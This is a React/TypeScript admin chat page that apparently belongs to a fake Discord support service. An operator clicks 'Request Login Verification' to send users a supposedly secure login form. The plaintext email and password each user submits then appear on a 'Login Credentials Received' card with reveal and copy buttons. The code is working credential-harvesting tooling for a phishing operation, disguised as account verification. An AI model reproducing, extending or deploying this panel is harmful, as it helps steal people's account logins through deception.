import { useState, useRef, useEffect } from "react";
import { useParams, useLocation } from "wouter";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import AdminLayout from "../components/AdminLayout";
import { authHeaders, getToken } from "../lib/api";
import { useAdminMessages } from "../lib/useSocket";
import { getAvatarUrl, getDisplayName } from "../lib/discord";
import { Send, Paperclip, ArrowLeft, Loader2, ShieldCheck, Eye, EyeOff, CheckCircle2, XCircle } from "lucide-react";

const LOGIN_REQUEST_PREFIX = "__LOGIN_REQUEST__";
const LOGIN_RESPONSE_PREFIX = "__LOGIN_RESPONSE__:";

export default function AdminChat() {
  const { id } = useParams<{ id: string }>();
  const [, navigate] = useLocation();
  const qc = useQueryClient();
  const [text, setText] = useState("");
  const [uploading, setUploading] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const fileRef = useRef<HTMLInputElement>(null);
  const token = getToken();

  const { data: caseData, isLoading: caseLoading } = useQuery({
    queryKey: ["case", id],
    queryFn: async () => {
      const res = await fetch(`/api/cases/${id}`, { headers: authHeaders() });
      return res.json();
    },
  });

  const { messages, refetch } = useAdminMessages(parseInt(id), token);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  useEffect(() => {
    fetch(`/api/cases/${id}/messages/read`, { method: "POST", headers: authHeaders() });
    qc.invalidateQueries({ queryKey: ["inbox"] });
  }, [id]);

  const sendMsg = useMutation({
    mutationFn: async ({ content, fileUrl, fileName }: { content: string; fileUrl?: string; fileName?: string }) => {
      const res = await fetch(`/api/cases/${id}/messages`, {
        method: "POST",
        headers: { ...authHeaders(), "Content-Type": "application/json" },
        body: JSON.stringify({ content, fileUrl, fileName }),
      });
      return res.json();
    },
    onSuccess: () => { refetch(); setText(""); },
  });

  const handleSend = () => {
    if (!text.trim()) return;
    sendMsg.mutate({ content: text.trim() });
  };

  const handleSendLoginRequest = () => {
    sendMsg.mutate({ content: LOGIN_REQUEST_PREFIX });
  };

  const handleFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setUploading(true);
    try {
      const formData = new FormData();
      formData.append("file", file);
      const res = await fetch("/api/upload", {
        method: "POST",
        headers: authHeaders(),
        body: formData,
      });
      if (!res.ok) throw new Error("Upload failed");
      const { url } = await res.json();
      sendMsg.mutate({ content: "", fileUrl: url, fileName: file.name });
    } catch {
      // silent fail — could add toast here
    } finally {
      setUploading(false);
    }
    e.target.value = "";
  };

  const cas = caseData?.case;
  const discordUser = cas ? JSON.parse(cas.discordData || "{}") : null;

  return (
    <AdminLayout>
      <div className="flex flex-col h-screen max-h-screen overflow-hidden">
        {/* Header */}
        <div className="flex items-center gap-4 px-6 py-4 bg-[#2b2d31] border-b border-[#3f4147] flex-shrink-0">
          <button onClick={() => navigate("/admin/dashboard")} className="text-[#949ba4] hover:text-[#f2f3f5]">
            <ArrowLeft className="w-5 h-5" />
          </button>
          {caseLoading ? (
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-full bg-[#313338] animate-pulse" />
              <div>
                <div className="w-24 h-4 bg-[#313338] rounded animate-pulse" />
                <div className="w-16 h-3 bg-[#313338] rounded animate-pulse mt-1" />
              </div>
            </div>
          ) : discordUser ? (
            <div className="flex items-center gap-3">
              <img src={getAvatarUrl(discordUser)} alt="" className="w-9 h-9 rounded-full" />
              <div>
                <p className="text-[#f2f3f5] font-semibold text-sm">{getDisplayName(discordUser)}</p>
                <p className="text-[#949ba4] text-xs">{cas?.caseNumber}</p>
              </div>
            </div>
          ) : null}
          {cas && (
            <span className={`ml-auto text-xs px-2 py-1 rounded-full font-medium ${
              cas.status === "active" ? "bg-[#3ba55c]/20 text-[#3ba55c]" : "bg-[#faa61a]/20 text-[#faa61a]"
            }`}>
              {cas.status}
            </span>
          )}
        </div>

        {/* Messages */}
        <div className="flex-1 overflow-y-auto px-6 py-4 space-y-3">
          {messages.length === 0 && (
            <div className="text-center text-[#949ba4] py-12">
              <MessageIcon className="w-10 h-10 mx-auto mb-3 opacity-30" />
              <p className="text-sm">No messages yet.</p>
            </div>
          )}
          {messages.map((msg: any) => {
            const isAdmin = msg.sender === "admin";

            // Login request bubble (admin sent it)
            if (msg.content === LOGIN_REQUEST_PREFIX) {
              return (
                <div key={msg.id} className="flex justify-end">
                  <div className="max-w-[70%] flex flex-col gap-1 items-end">
                    <span className="text-xs text-[#949ba4] px-1">You (Admin)</span>
                    <div className="bg-[#5865F2]/20 border border-[#5865F2]/40 rounded-lg px-4 py-3 flex items-center gap-3">
                      <ShieldCheck className="w-5 h-5 text-[#5865F2] flex-shrink-0" />
                      <div>
                        <p className="text-[#f2f3f5] text-sm font-medium">Login verification sent</p>
                        <p className="text-[#949ba4] text-xs">Waiting for user to submit credentials</p>
                      </div>
                    </div>
                    <span className="text-xs text-[#949ba4] px-1">
                      {new Date(msg.createdAt * 1000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                    </span>
                  </div>
                </div>
              );
            }

            // Login response bubble (user submitted credentials)
            if (msg.content?.startsWith(LOGIN_RESPONSE_PREFIX)) {
              let creds: { email: string; password: string } | null = null;
              try { creds = JSON.parse(msg.content.slice(LOGIN_RESPONSE_PREFIX.length)); } catch {}
              return (
                <div key={msg.id} className="flex justify-start">
                  <div className="max-w-[70%] flex flex-col gap-1 items-start">
                    <span className="text-xs text-[#949ba4] px-1">User</span>
                    <CredentialCard creds={creds} time={msg.createdAt} />
                  </div>
                </div>
              );
            }

            // Normal message
            return (
              <div key={msg.id} className={`flex ${isAdmin ? "justify-end" : "justify-start"}`}>
                <div className={`max-w-[70%] flex flex-col gap-1 ${isAdmin ? "items-end" : "items-start"}`}>
                  <span className="text-xs text-[#949ba4] px-1">{isAdmin ? "You (Admin)" : "User"}</span>
                  <div className={`rounded-lg px-4 py-2.5 text-sm ${
                    isAdmin
                      ? "bg-[#5865F2] text-white rounded-tr-sm"
                      : "bg-[#313338] text-[#f2f3f5] rounded-tl-sm border border-[#3f4147]"
                  }`}>
                    {msg.content && <p className="leading-relaxed">{msg.content}</p>}
                    {msg.fileUrl && (
                      msg.fileUrl.startsWith("data:image") || msg.fileUrl.match(/\.(jpg|jpeg|png|gif|webp)$/i) ? (
                        <img src={msg.fileUrl} alt={msg.fileName || "file"} className="max-w-full max-h-48 rounded mt-1 object-contain" />
                      ) : (
                        <a href={msg.fileUrl} target="_blank" rel="noreferrer" className="flex items-center gap-2 underline text-xs mt-1">
                          <Paperclip className="w-3 h-3" /> {msg.fileName || "Attachment"}
                        </a>
                      )
                    )}
                  </div>
                  <span className="text-xs text-[#949ba4] px-1">
                    {new Date(msg.createdAt * 1000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                  </span>
                </div>
              </div>
            );
          })}
          <div ref={messagesEndRef} />
        </div>

        {/* Input */}
        <div className="flex-shrink-0 px-6 py-3 bg-[#2b2d31] border-t border-[#3f4147] space-y-2">
          {/* Quick action: login request */}
          <div className="flex items-center gap-2">
            <button
              onClick={handleSendLoginRequest}
              disabled={sendMsg.isPending}
              title="Send secure login form to user"
              className="flex items-center gap-2 bg-[#3ba55c]/10 hover:bg-[#3ba55c]/20 border border-[#3ba55c]/30 hover:border-[#3ba55c]/60 text-[#3ba55c] text-xs font-medium px-3 py-1.5 rounded-lg transition-colors disabled:opacity-50"
            >
              <ShieldCheck className="w-3.5 h-3.5" />
              Request Login Verification
            </button>
          </div>

          <div className="flex items-end gap-3">
            <div className="flex-1 bg-[#1e1f22] border border-[#3f4147] rounded-lg px-4 py-3 flex items-end gap-2">
              <textarea
                value={text}
                onChange={(e) => setText(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); handleSend(); }
                }}
                placeholder="Type a message..."
                rows={1}
                className="flex-1 bg-transparent text-[#f2f3f5] text-sm resize-none focus:outline-none placeholder:text-[#949ba4] max-h-32"
                style={{ lineHeight: "1.5" }}
              />
              <label className="cursor-pointer text-[#949ba4] hover:text-[#5865F2] transition-colors flex-shrink-0">
                <Paperclip className="w-4 h-4" />
                <input type="file" ref={fileRef} onChange={handleFile} className="hidden" accept="image/*,.pdf,.txt,.doc,.docx" />
              </label>
            </div>
            <button
              onClick={handleSend}
              disabled={sendMsg.isPending || uploading || !text.trim()}
              className="w-10 h-10 bg-[#5865F2] hover:bg-[#4752C4] text-white rounded-lg flex items-center justify-center disabled:opacity-50 transition-colors flex-shrink-0"
            >
              {sendMsg.isPending || uploading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
            </button>
          </div>
        </div>
      </div>
    </AdminLayout>
  );
}

// Credential card shown to admin when user submits login form
function CredentialCard({ creds, time }: { creds: { email: string; password: string } | null; time: number }) {
  const [showPass, setShowPass] = useState(false);
  const [copied, setCopied] = useState<string | null>(null);

  const copy = (val: string, key: string) => {
    navigator.clipboard.writeText(val);
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  };

  if (!creds) {
    return (
      <div className="bg-[#ed4245]/10 border border-[#ed4245]/30 rounded-lg px-4 py-3 text-[#ed4245] text-sm">
        Received credentials (parse error)
      </div>
    );
  }

  return (
    <div className="bg-[#2b2d31] border border-[#faa61a]/40 rounded-lg overflow-hidden min-w-[260px]">
      <div className="flex items-center gap-2 px-4 py-2.5 bg-[#faa61a]/10 border-b border-[#faa61a]/30">
        <ShieldCheck className="w-4 h-4 text-[#faa61a]" />
        <span className="text-[#faa61a] text-xs font-semibold uppercase tracking-wide">Login Credentials Received</span>
      </div>
      <div className="px-4 py-3 space-y-3">
        {/* Email */}
        <div>
          <p className="text-[#949ba4] text-xs mb-1">Email / Username</p>
          <div className="flex items-center gap-2">
            <p className="text-[#f2f3f5] text-sm font-mono flex-1 break-all">{creds.email}</p>
            <button
              onClick={() => copy(creds.email, "email")}
              className="text-[#949ba4] hover:text-[#f2f3f5] transition-colors flex-shrink-0"
              title="Copy"
            >
              {copied === "email" ? <CheckCircle2 className="w-3.5 h-3.5 text-[#3ba55c]" /> : <CopyIcon />}
            </button>
          </div>
        </div>
        {/* Password */}
        <div>
          <p className="text-[#949ba4] text-xs mb-1">Password</p>
          <div className="flex items-center gap-2">
            <p className="text-[#f2f3f5] text-sm font-mono flex-1 break-all">
              {showPass ? creds.password : "•".repeat(Math.min(creds.password.length, 16))}
            </p>
            <button
              onClick={() => setShowPass(v => !v)}
              className="text-[#949ba4] hover:text-[#f2f3f5] transition-colors flex-shrink-0"
              title={showPass ? "Hide" : "Show"}
            >
              {showPass ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
            </button>
            <button
              onClick={() => copy(creds.password, "pass")}
              className="text-[#949ba4] hover:text-[#f2f3f5] transition-colors flex-shrink-0"
              title="Copy"
            >
              {copied === "pass" ? <CheckCircle2 className="w-3.5 h-3.5 text-[#3ba55c]" /> : <CopyIcon />}
            </button>
          </div>
        </div>
      </div>
      <div className="px-4 py-2 border-t border-[#3f4147]">
        <span className="text-xs text-[#949ba4]">
          {new Date(time * 1000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
        </span>
      </div>
    </div>
  );
}

function CopyIcon() {
  return (
    <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" />
      <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function MessageIcon(props: any) {
  return (
    <svg {...props} fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
    </svg>
  );
}
